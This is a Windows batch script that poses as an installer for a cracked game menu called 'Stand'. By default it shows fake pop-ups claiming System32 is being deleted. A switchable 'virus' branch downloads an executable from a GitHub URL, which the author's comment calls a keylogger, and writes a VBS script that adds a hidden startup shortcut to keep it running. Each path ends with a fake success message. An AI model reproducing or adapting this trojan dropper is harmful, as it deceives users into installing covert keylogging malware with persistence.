


::Hi Whoever I Sent this To.
::I hope you enjoy what I Made
::Just go to temp and go to startup to delete files



@echo off
title Stand Cracked - error1256
chcp 65001 >nul
mode 200,45 >nul
set Edition=Basic
:banner
cls
echo.
echo.
echo [95m███████╗████████╗ █████╗ ███╗   ██╗██████╗      ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗  [0m
echo [95m██╔════╝╚══██╔══╝██╔══██╗████╗  ██║██╔══██╗    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗ [0m
echo [95;2m███████╗   ██║   ███████║██╔██╗ ██║██║  ██║    ██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██║  ██║ [0m
echo [95;2m╚════██║   ██║   ██╔══██║██║╚██╗██║██║  ██║    ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║ [0m
echo [35m███████║   ██║   ██║  ██║██║ ╚████║██████╔╝    ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝ [0m
echo [95m╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝      ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝  [0m
:menu
echo.
echo Press 1 then Enter to Download the [95mStand Menu[0m, Made by error1256
echo 1) Install Menu
echo 2) Options
set /p input=">>"
if %input% EQU 1 goto input1
if %input% EQU 2 goto input2
if %input% EQU 8 goto input3


::remove the :: in goto virus in input1 to enable Virus
::add the :: in goto fakevirus in input1 to enable Virus

::remove the :: in goto fakevirusvirus in input1 to disable Virus
::add the :: in goto virus in input1 to disable Virus


:input1
cls
::goto virus
goto fakevirus
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Succesfully Downloaded Stand %Edition%', 'Stand Installer', 'OK', [System.Windows.Forms.MessageBoxIcon]::Information);}"
cls
goto input3

:input5
cls
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Succesfully Downloaded Stand %Edition%', 'Stand Installer', 'OK', [System.Windows.Forms.MessageBoxIcon]::Information);}"
cls
goto input3

:input2
cls
echo  [95m██████╗ ██████╗ ████████╗██╗ ██████╗ ███╗   ██╗███████╗[0m
echo [95m██╔═══██╗██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝[0m
echo [95;2m██║   ██║██████╔╝   ██║   ██║██║   ██║██╔██╗ ██║███████╗[0m
echo [95;2m██║   ██║██╔═══╝    ██║   ██║██║   ██║██║╚██╗██║╚════██║[0m
echo [35m╚██████╔╝██║        ██║   ██║╚██████╔╝██║ ╚████║███████║[0m
echo  [95m╚═════╝ ╚═╝        ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝[0m
echo '
echo '
echo '
echo '
echo '
echo '
echo '
echo '
echo 1) Basic
echo 2) Regular
echo 3) Ultimate
echo '
echo '
echo '
echo 4) See Current Edition
echo 5) Go Back
set /p input=">>"
if %input% EQU 1 set Edition=Basic && powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Settings Changed to Basic', 'Stand Installer', 'OK', [System.Windows.Forms.MessageBoxIcon]::Information);}"
if %input% EQU 2 set Edition=Regular && powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Settings Changed to Regular', 'Stand Installer', 'OK', [System.Windows.Forms.MessageBoxIcon]::Information);}"
if %input% EQU 3 set Edition=Ultimate && powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Settings Changed to Ultimate', 'Stand Installer', 'OK', [System.Windows.Forms.MessageBoxIcon]::Information);}"
if %input% EQU 4 powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Current Edition: %Edition%', 'Stand Installer', 'OK', [System.Windows.Forms.MessageBoxIcon]::Information);}"
if %input% EQU 5 goto banner
cls
goto input2

:input3
cls
echo  [95m██████╗██████╗ ███████╗██████╗ ██╗████████╗███████╗[0m
echo [95m██╔════╝██╔══██╗██╔════╝██╔══██╗██║╚══██╔══╝██╔════╝[0m
echo [95;2m██║     ██████╔╝█████╗  ██║  ██║██║   ██║   ███████╗[0m
echo [95;2m██║     ██╔══██╗██╔══╝  ██║  ██║██║   ██║   ╚════██║[0m
echo [35m╚██████╗██║  ██║███████╗██████╔╝██║   ██║   ███████║[0m
echo  [95m╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝   ╚═╝   ╚══════╝[0m
echo '
echo '
echo Hope You Enjoy Your [95mStand Menu[0m
echo Have a Great Day
echo https://guns.lol/errorC003C004
echo '
echo '
echo '
echo Type Enter to Quit
set /p input=">>"
if %input% EQU 1 goto exit
if %input% EQU 8 goto banner
cls
exit

:virus
cls

::Shortcut Start
set TARGET_PATH=powershell -Command "$process = Start-Process -FilePath 'C:\Temp\FromError.exe' -WindowStyle Hidden -Passthru"
set SHORTCUT_PATH="C:\Users\Juare\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\FromError.lnk"

echo Set oWS = WScript.CreateObject("WScript.Shell") > "%temp%\CreateShortcut.vbs"
echo sLinkFile = %SHORTCUT_PATH% >> "%temp%\CreateShortcut.vbs"
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> "%temp%\CreateShortcut.vbs"
echo oLink.TargetPath = "powershell" >> "%temp%\CreateShortcut.vbs"
echo oLink.Arguments = "-Command ""$process = Start-Process -FilePath 'C:\Temp\FromError.exe' -WindowStyle Hidden -Passthru""" >> "%temp%\CreateShortcut.vbs"
echo oLink.WindowStyle = 7 >> "%temp%\CreateShortcut.vbs"  REM 7 = Hidden
echo oLink.Save >> "%temp%\CreateShortcut.vbs"

cscript //nologo "%temp%\CreateShortcut.vbs"
del "%temp%\CreateShortcut.vbs"
::shortcut End
::This is a Keylogger I made for my friends, Please dont use
:: Download part Starts
setlocal

:: URL AND FILE NAME/TYPE
set "url=https://github.com/error1256/Dont-Use-Me/raw/main/main.exe"
set "output=C:\Temp\FromError.exe"

:: Dont Edit
powershell -command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"

endlocal
::Download part ended
:: File Opens in Backround
::/powershell -Command "$process = Start-Process -FilePath "C:\Temp\FromError.exe" -WindowStyle Hidden -Passthru"
::ends
goto input5

:fakevirus
cls
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Closing Any Windows will Delete all System Files', 'Windows', 'OK', [System.Windows.Forms.MessageBoxIcon]::Warning);}"
cls
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Deleting C:/Windows/System32', 'Windows', 'OK', [System.Windows.Forms.MessageBoxIcon]::Warning);}"
cls
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Permission Denied, Overide Permission?', 'Windows', 'YesNo', [System.Windows.Forms.MessageBoxIcon]::Warning);}"
cls
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Are You Sure You Want To Delete System32?', 'Windows', 'YesNo', [System.Windows.Forms.MessageBoxIcon]::Warning);}"
cls
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Successfully Deleted System32', 'Windows', 'OK', [System.Windows.Forms.MessageBoxIcon]::Warning);}"
cls
goto input5
